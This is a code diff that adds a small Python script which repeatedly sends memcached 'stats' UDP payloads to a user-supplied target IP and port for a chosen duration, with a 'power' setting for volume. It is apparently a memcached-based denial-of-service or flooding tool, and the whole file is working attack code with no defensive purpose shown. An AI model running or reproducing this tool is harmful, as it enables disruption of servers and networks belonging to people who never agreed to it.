@@ -1,0 +1,32 @@
+import socket
+import time
+
+def send_memcached_payload(target, target_port=11211, power=1, data=b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for _ in range(power):
+            sock.sendto(data, (target, target_port))
+        print("[+] Payload sent successfully to {}:{}".format(target, target_port))
+    except Exception as e:
+        print("[✘] Error: {}".format(e))
+
+def main():
+    target_ip = input("[▸] Enter target IP address: ")
+    try:
+        target_port = int(input("[▸] Enter target port number (Default 11211): ") or 11211)
+        power = int(input("[▸] Enter preferred power (Default 1): ") or 1)
+        duration = int(input("[▸] Enter duration in seconds for the script to run: "))
+    except ValueError:
+        print("[✘] Error: Invalid input.")
+        return
+
+    start_time = time.time()
+    end_time = start_time + duration
+
+    while time.time() < end_time:
+        send_memcached_payload(target_ip, target_port, power)
+
+    print("[•] Script has completed running for {} seconds.".format(duration))
+
+if __name__ == "__main__":
+    main()
